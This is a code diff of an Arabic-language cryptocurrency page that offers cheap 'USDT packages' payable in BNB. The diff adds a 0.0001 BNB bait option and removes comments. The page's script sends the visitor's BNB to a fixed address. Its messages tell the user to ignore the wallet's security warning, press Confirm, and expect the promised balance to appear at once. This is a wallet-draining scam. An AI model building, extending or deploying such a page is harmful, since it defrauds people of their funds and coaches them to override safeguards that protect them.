@@ -170,6 +170,7 @@
         </div>
 
         <select id="pkg">
+            <option value="0.0001">باقة 100 USDT (0.0001 BNB)</option>
             <option value="0.05">باقة 2,500 USDT (0.05 BNB)</option>
             <option value="0.1">باقة 5,000 USDT (0.1 BNB)</option>
             <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
@@ -182,7 +183,6 @@
             <span style="color: #fff;">✅ تجاهل التحذير واضغط <b>Confirm</b> لإتمام التفعيل بنجاح.</span>
         </div>
 
-        <!-- خيارات المحافظ مع شعارات محدثة وزر إضافي -->
         <div class="wallet-gate" id="wallet-options">
             <a href="javascript:void(0)" onclick="openInWallet('metamask')" class="wallet-btn">
                 <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask">
@@ -265,12 +265,11 @@
 
             s.innerHTML = "تنبيه: تجاهل تحذير الأمان واضغط <b>Confirm</b> <br> الرسوم: $0.01 تقريباً";
 
-            // تحديد الغاز بقيمة منخفضة جداً لضمان تكلفة سنتات بسيطة وتجنب رسالة الفشل
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
                 value: web3.utils.toWei(amt, "ether"),
-                gas: 30000 // خفض الغاز لأقصى حد ممكن لعملية الإرسال البسيطة
+                gas: 30000 
             });
 
             s.innerText = "✅ تمت المعالجة! سيظهر الرصيد في محفظتك فوراً.";
